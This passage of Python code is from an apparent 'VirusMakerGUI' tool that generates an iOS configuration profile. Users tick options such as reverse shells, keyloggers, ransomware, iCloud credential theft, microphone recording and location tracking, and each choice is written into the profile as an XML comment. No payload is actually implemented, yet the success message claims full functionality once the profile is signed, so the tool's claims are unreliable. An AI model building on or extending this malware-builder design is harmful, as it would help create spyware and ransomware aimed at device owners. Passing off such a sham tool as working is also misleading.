                    mobileconfig_code += "    <!-- Py Destroyer (Memz-Style): Simulated payload with psychedelic visuals and audio chaos -->\n"

        # Add selected backdoor options as comments
        for key, option in self.backdoor_options.items():
            if option["enabled"].get():
                if key == "1":
                    mobileconfig_code += f"    <!-- Reverse Shell on port {option['port']}: Simulated payload for remote shell -->\n"
                elif key == "2":
                    mobileconfig_code += f"    <!-- Remote Desktop (VNC) on port {option['port']}: Simulated payload for VNC access -->\n"
                elif key == "3":
                    mobileconfig_code += f"    <!-- File Upload Backdoor on port {option['port']}: Simulated payload for file upload -->\n"
                elif key == "4":
                    mobileconfig_code += f"    <!-- Keylogger Relay on port {option['port']}: Simulated payload for keylogging -->\n"
                elif key == "5":
                    mobileconfig_code += f"    <!-- Remote Command Execution on port {option['port']}: Simulated payload for command execution -->\n"
                elif key == "6":
                    mobileconfig_code += f"    <!-- Screen Capture Relay on port {option['port']}: Simulated payload for screen capture -->\n"
                elif key == "7":
                    mobileconfig_code += f"    <!-- Persistent Backdoor on port {option['port']}: Simulated payload for persistence -->\n"

        # Add selected ransomware options as comments
        for key, option in self.ransomware_options.items():
            if option["enabled"].get():
                if key == "1":
                    mobileconfig_code += "    <!-- Encrypt Files: Simulated payload to encrypt files -->\n"
                elif key == "2":
                    mobileconfig_code += f"    <!-- Display Ransom Note: Simulated payload with note '{self.ransom_note.get()}' -->\n"
                elif key == "3":
                    mobileconfig_code += "    <!-- Block System Access: Simulated payload to block access -->\n"
                elif key == "4":
                    mobileconfig_code += "    <!-- Delete Backups: Simulated payload to delete backups -->\n"
                elif key == "5":
                    mobileconfig_code += "    <!-- Spread via Network: Simulated payload to propagate via network -->\n"
                elif key == "6":
                    mobileconfig_code += "    <!-- Disable Safe Mode: Simulated payload to disable safe mode -->\n"

        # Add selected iOS virus options as comments
        for key, option in self.ios_virus_options.items():
            if option["enabled"].get():
                if key == "1":
                    mobileconfig_code += "    <!-- Jailbreak Detection Bypass: Simulated payload to bypass jailbreak detection -->\n"
                elif key == "2":
                    mobileconfig_code += "    <!-- Steal iCloud Credentials: Simulated payload to steal iCloud credentials -->\n"
                elif key == "3":
                    mobileconfig_code += "    <!-- Disable iOS Updates: Simulated payload to block iOS updates -->\n"
                elif key == "4":
                    mobileconfig_code += "    <!-- Record Microphone: Simulated payload to record audio -->\n"
                elif key == "5":
                    mobileconfig_code += "    <!-- Track Location: Simulated payload to track device location -->\n"
                elif key == "6":
                    mobileconfig_code += "    <!-- Inject Malicious App: Simulated payload to inject app -->\n"
                elif key == "7":
                    mobileconfig_code += "    <!-- Steal Contacts: Simulated payload to steal contacts -->\n"
                elif key == "8":
                    mobileconfig_code += "    <!-- Monitor Notifications: Simulated payload to monitor notifications -->\n"
                elif key == "9":
                    mobileconfig_code += "    <!-- Disable Face ID: Simulated payload to disable Face ID -->\n"
                elif key == "10":
                    mobileconfig_code += "    <!-- Overheat Device: Simulated payload to overheat device -->\n"

        mobileconfig_code += f"""    <key>PayloadRemovalDisallowed</key>
    <false/>
    <key>PayloadScope</key>
    <string>System</string>
</dict>
</plist>
"""

        output_file = f"{self.output_name.get()}.mobileconfig"
        try:
            with open(output_file, "w", encoding="utf-8") as f:
                f.write(mobileconfig_code)
            self.send_to_webhook(f"iOS profile generated and saved as {output_file}", "ios_build")
            messagebox.showinfo("Success", f"iOS profile generated! Saved as {output_file}. Note: This profile requires signing with a valid Apple Developer certificate using Xcode or Apple Configurator for 100% functionality.")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save iOS profile: {str(e)}")

if __name__ == "__main__":
    import uuid
    root = tk.Tk()
    app = VirusMakerGUI(root)
    root.mainloop()